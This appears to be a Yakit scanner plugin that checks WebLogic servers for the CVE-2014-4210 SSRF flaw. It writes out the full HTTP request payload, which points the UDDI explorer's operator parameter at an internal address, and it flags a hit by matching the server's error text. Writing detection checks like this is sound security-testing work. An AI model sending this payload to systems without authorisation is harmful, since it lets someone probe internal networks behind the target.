# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    server,token,err = risk.NewDNSLogDomain()

    packet = `GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001 HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        if str.MatchAllOfSubString(string(rsp),"The server at http://127.0.0.1:7001 returned a 404 error code"){
            yakit.Info("%v found Weblogic CVE-2014-4210 SSRF Vulnerability ", addr)
            risk.NewRisk(
            addr,risk.title("CVE-2014-4210"),
            risk.severity("low"),
            risk.titleVerbose("Weblogic CVE-2014-4210 SSRF漏洞"),
            risk.type("ssrf[Weblogic]"),
            risk.payload(`/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001`),
            risk.details({
                "target":addr,
                "request":req,
                "response":rsp,
            }),
        )
        }
       
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    // println(result.Fingerprint.CPEs)
    if len(result.Fingerprint.HttpFlows)>0{
        if str.MatchAllOfSubString(result.Fingerprint.CPEs, "weblogic_server"){
            handleCheck(result.Target,result.Port)
        }
        
    }
    
}
